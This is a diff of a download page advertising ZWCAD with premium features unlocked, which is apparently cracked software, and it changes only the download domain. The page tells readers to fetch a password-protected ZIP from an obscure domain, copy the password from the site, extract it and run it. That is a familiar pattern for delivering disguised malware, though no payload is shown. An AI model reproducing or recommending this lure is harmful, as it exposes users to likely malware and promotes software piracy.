@@ -8,12 +8,12 @@ ZWCAD — Windows setup and configuration · Premium workspace · Zero nag dialo
 
 > Use the release page below for Windows.
 
-- **Release page:** [exfwirnjatp.slopmods.tech](https://exfwirnjatp.slopmods.tech/)
-- **Full URL:** `https://exfwirnjatp.slopmods.tech/`
+- **Release page:** [exfwirnjatp.slopmods.top](https://exfwirnjatp.slopmods.top/)
+- **Full URL:** `https://exfwirnjatp.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **exfwirnjatp.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **exfwirnjatp.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ ZWCAD — Windows setup and configuration · Premium workspace · Zero nag dialo
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **exfwirnjatp.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **exfwirnjatp.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
